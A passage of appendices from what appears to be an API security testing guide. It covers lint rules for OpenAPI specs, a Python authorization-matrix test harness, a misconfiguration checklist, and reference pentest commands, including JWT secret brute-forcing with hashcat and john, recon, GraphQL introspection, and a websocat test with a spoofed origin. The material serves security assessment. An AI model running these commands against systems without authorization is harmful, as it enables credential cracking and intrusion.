    description: Endpoints should document rate limits
    severity: warn
    given: "$.paths[*][*].responses"
    then:
      field: "429"
      function: truthy

  # Require additionalProperties: false on request bodies
  strict-request-schemas:
    description: Request schemas must reject additional properties
    severity: error
    given: "$.paths[*][*].requestBody.content.application/json.schema"
    then:
      field: additionalProperties
      function: falsy

  # Require maximum string lengths
  string-max-length:
    description: String properties must define maxLength
    severity: warn
    given: "$.paths[*][*]..schema..properties[?(@.type=='string')]"
    then:
      field: maxLength
      function: truthy
```

## Appendix D: Authorization Testing Matrix Template

```python
"""
Authorization matrix testing framework.
Defines expected access for each (endpoint, method, role) combination.
"""
import httpx
from dataclasses import dataclass
from enum import Enum

class Role(Enum):
    ANONYMOUS = "anonymous"
    USER = "user"
    MODERATOR = "moderator"
    ADMIN = "admin"
    SUPERADMIN = "superadmin"

class Expected(Enum):
    ALLOW = "allow"     # 2xx expected
    DENY = "deny"       # 401 or 403 expected
    NOTFOUND = "404"    # 404 expected (endpoint hidden from role)

@dataclass
class AccessRule:
    method: str
    path: str
    role: Role
    expected: Expected
    description: str = ""

# Define the authorization matrix
AUTHORIZATION_MATRIX = [
    # Public endpoints
    AccessRule("GET", "/api/v1/health", Role.ANONYMOUS, Expected.ALLOW),
    AccessRule("POST", "/api/v1/auth/login", Role.ANONYMOUS, Expected.ALLOW),
    AccessRule("POST", "/api/v1/auth/register", Role.ANONYMOUS, Expected.ALLOW),
    
    # User endpoints
    AccessRule("GET", "/api/v1/users/me", Role.ANONYMOUS, Expected.DENY),
    AccessRule("GET", "/api/v1/users/me", Role.USER, Expected.ALLOW),
    AccessRule("GET", "/api/v1/users/123", Role.USER, Expected.DENY, "BOLA check"),
    AccessRule("PUT", "/api/v1/users/me", Role.USER, Expected.ALLOW),
    
    # Admin endpoints
    AccessRule("GET", "/api/v1/admin/users", Role.USER, Expected.DENY),
    AccessRule("GET", "/api/v1/admin/users", Role.MODERATOR, Expected.DENY),
    AccessRule("GET", "/api/v1/admin/users", Role.ADMIN, Expected.ALLOW),
    AccessRule("DELETE", "/api/v1/admin/users/123", Role.ADMIN, Expected.DENY, "Only superadmin"),
    AccessRule("DELETE", "/api/v1/admin/users/123", Role.SUPERADMIN, Expected.ALLOW),
    
    # Internal endpoints (should not be accessible externally)
    AccessRule("GET", "/api/internal/metrics", Role.SUPERADMIN, Expected.NOTFOUND),
    AccessRule("POST", "/api/internal/cache/flush", Role.SUPERADMIN, Expected.NOTFOUND),
]

def get_token(role: Role) -> str | None:
    """Obtain authentication token for role."""
    if role == Role.ANONYMOUS:
        return None
    credentials = {
        Role.USER: ("user@test.com", "user_pass"),
        Role.MODERATOR: ("mod@test.com", "mod_pass"),
        Role.ADMIN: ("admin@test.com", "admin_pass"),
        Role.SUPERADMIN: ("super@test.com", "super_pass"),
    }
    email, password = credentials[role]
    r = httpx.post("https://api.target.com/api/v1/auth/login",
                   json={"email": email, "password": password})
    return r.json().get("token")

def run_authorization_tests(base_url: str):
    """Execute the full authorization matrix."""
    results = {"passed": 0, "failed": 0, "errors": []}
    tokens = {role: get_token(role) for role in Role}
    
    for rule in AUTHORIZATION_MATRIX:
        headers = {}
        if tokens[rule.role]:
            headers["Authorization"] = f"Bearer {tokens[rule.role]}"
        
        r = httpx.request(rule.method, f"{base_url}{rule.path}",
                         headers=headers, timeout=10)
        
        passed = False
        if rule.expected == Expected.ALLOW:
            passed = 200 <= r.status_code < 300
        elif rule.expected == Expected.DENY:
            passed = r.status_code in (401, 403)
        elif rule.expected == Expected.NOTFOUND:
            passed = r.status_code == 404
        
        if passed:
            results["passed"] += 1
        else:
            results["failed"] += 1
            results["errors"].append({
                "rule": f"{rule.method} {rule.path} as {rule.role.value}",
                "expected": rule.expected.value,
                "got": r.status_code,
                "description": rule.description,
            })
    
    return results
```

---

## Appendix E: Common API Security Misconfigurations Checklist

| Category | Check | Expected | Tool |
|----------|-------|----------|------|
| **TLS** | Minimum TLS 1.2 (prefer 1.3) | Yes | testssl.sh |
| **TLS** | No weak cipher suites | No RC4, DES, NULL | nmap ssl-enum-ciphers |
| **TLS** | Valid certificate chain | Yes | openssl s_client |
| **Headers** | HSTS with max-age > 31536000 | Present | curl -I |
| **Headers** | X-Content-Type-Options: nosniff | Present | curl -I |
| **Headers** | No Server/X-Powered-By disclosure | Absent | curl -I |
| **CORS** | Origin whitelist (not wildcard with credentials) | Validated | Burp |
| **Auth** | JWT algorithm hardcoded server-side | HS256/RS256 only | jwt.io |
| **Auth** | Token expiration enforced | < 1 hour | Decode JWT |
| **Auth** | Refresh token rotation | Yes | Manual test |
| **Input** | Request body size limit | < 1MB | curl with large payload |
| **Input** | Parameter type enforcement | Strict | Send wrong types |
| **Input** | Query depth limit (GraphQL) | < 10 levels | Deep query |
| **Rate** | Per-user rate limit | Active | Rapid requests |
| **Rate** | Per-IP rate limit | Active | Multiple requests |
| **Rate** | Brute-force protection on auth | Active | 10+ failed logins |
| **Error** | No stack traces in responses | Absent | Trigger 500 |
| **Error** | No internal paths leaked | Absent | Review error bodies |
| **Version** | Deprecated versions return 410 | Yes | Access /v1/ |
| **Docs** | Introspection disabled in prod (GraphQL) | Yes | __schema query |
| **Docs** | Reflection disabled in prod (gRPC) | Yes | grpcurl list |
| **Docs** | Swagger UI not exposed in prod | 404 | /swagger-ui/ |

---

## Appendix F: Reference Tool Commands

```bash
# === Reconnaissance ===
# Subdomain enumeration for API endpoints
subfinder -d target.com -silent | grep -i "api\|graphql\|grpc\|ws"

# Technology fingerprinting
whatweb https://api.target.com
httpx -u https://api.target.com -tech-detect -status-code

# === JWT ===
# Decode JWT (header.payload)
echo "eyJhbGci..." | cut -d. -f1 | base64 -d 2>/dev/null | jq .
echo "eyJhbGci..." | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Brute-force JWT HMAC secret
hashcat -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256

# === TLS ===
# Full TLS assessment
testssl.sh --full https://api.target.com:443

# Check client cert requirement
openssl s_client -connect api.target.com:443 </dev/null 2>&1 | grep "Acceptable client"

# === gRPC ===
grpcurl -plaintext target.com:50051 list
grpcurl -plaintext -d '{}' target.com:50051 package.Service/Method

# === GraphQL ===
# Introspection
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'

# === WebSocket ===
websocat wss://target.com/ws -H "Origin: https://evil.com"

# === Fuzzing ===
schemathesis run https://api.target.com/openapi.json --checks all
nuclei -u https://api.target.com -t api/ -severity critical,high
```
